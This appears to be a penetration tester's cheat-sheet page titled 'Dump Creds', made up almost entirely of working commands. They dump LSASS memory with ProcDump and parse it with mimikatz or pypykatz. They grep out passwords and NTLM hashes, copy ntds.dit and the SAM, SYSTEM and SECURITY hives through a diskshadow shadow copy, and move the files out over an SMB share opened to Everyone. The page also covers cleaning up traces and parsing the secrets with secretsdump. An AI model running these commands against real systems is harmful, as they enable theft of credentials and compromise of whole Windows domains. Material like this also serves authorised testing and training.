# Dump Creds

## Description

## Useful Commands

### ProcDump

* [docs.microsoft.com/en-us/sysinternals/downloads/procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)
* [download.sysinternals.com/files/Procdump.zip](https://download.sysinternals.com/files/Procdump.zip)

Dump and parse:

```
PS > .\procdump64.exe -accepteula -64 -ma lsass.exe lsass.dmp
$ pypykatz lsa minidump lsass.dmp > lsass-pypykatz.minidump
Or
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonPasswords full
```

Grep for secrets:

```
$ grep '* Username : ' lsass-mimikatz.minidump -A2 | grep -e Username -e Password -e NTLM | grep -v null | xclip -i -sel c
$ grep -P '\tusername ' lsass-pypykatz.minidump -A2 | grep -e username -e password | grep -v None | xclip -i -sel c
```



### SAM & NTDS

Locate `diskshadow.exe`:

```
cmd /c where /R C:\ diskshadow.exe
```

Create shadow volume:

```
powershell -c "Add-Content add_vol.txt 'set context persistent nowriters'"
powershell -c "Add-Content add_vol.txt 'set metadata C:\Windows\Temp\meta.cab'"
powershell -c "Add-Content add_vol.txt 'set verbose on'"
powershell -c "Add-Content add_vol.txt 'begin backup'"
powershell -c "Add-Content add_vol.txt 'add volume c: alias DCROOT'"
powershell -c "Add-Content add_vol.txt 'create'"
powershell -c "Add-Content add_vol.txt 'expose %DCROOT% w:'"
powershell -c "Add-Content add_vol.txt 'end backup'"
cmd /c diskshadow.exe /s add_vol.txt
```

```
// add_vol.txt
set context persistent nowriters
set metadata C:\Windows\Temp\meta.cab
set verbose on
begin backup
add volume c: alias DCROOT
create
expose %DCROOT% w:
end backup
```

Exfiltrate over SMB:

```
mkdir C:\smb_pentest
copy w:\Windows\NTDS\ntds.dit C:\smb_pentest\ntds.dit
cmd /c reg.exe save hklm\system C:\smb_pentest\system.hive
cmd /c reg.exe save hklm\sam C:\smb_pentest\sam.hive
cmd /c reg.exe save hklm\security C:\smb_pentest\security.hive
cmd /c net share pentest=c:\smb_pentest /GRANT:"Everyone,FULL"

$ smbclient.py 'snovvcrash:Passw0rd!@127.0.0.1'
# use pentest
# get ntds.dit
# get system.hive
# get sam.hive
# get security.hive
```

Delete shadow volume:

```
powershell -c "Add-Content delete_vol.txt 'set context persistent nowriters'"
powershell -c "Add-Content delete_vol.txt 'set metadata C:\Windows\Temp\meta.cab'"
powershell -c "Add-Content delete_vol.txt 'set verbose on'"
powershell -c "Add-Content delete_vol.txt 'unexpose w:'"
powershell -c "Add-Content delete_vol.txt 'delete shadows volume c:'"
powershell -c "Add-Content delete_vol.txt 'reset'"
cmd /c diskshadow.exe /s delete_vol.txt
```

```
// delete_vol.txt
set context persistent nowriters
set metadata C:\Windows\Temp\meta.cab
set verbose on
unexpose w:
delete shadows volume c:
reset
```

Clean up:

```
cmd /c net share pentest /delete
rm -re -fo C:\smb_pentest
rm C:\Windows\Temp\meta.cab
rm add_vol.txt
rm delete_vol.txt
```

Parse secrets:

```
$ secretsdump.py -sam sam.hive -system system.hive -security security.hive -ntds ntds.dit LOCAL
```

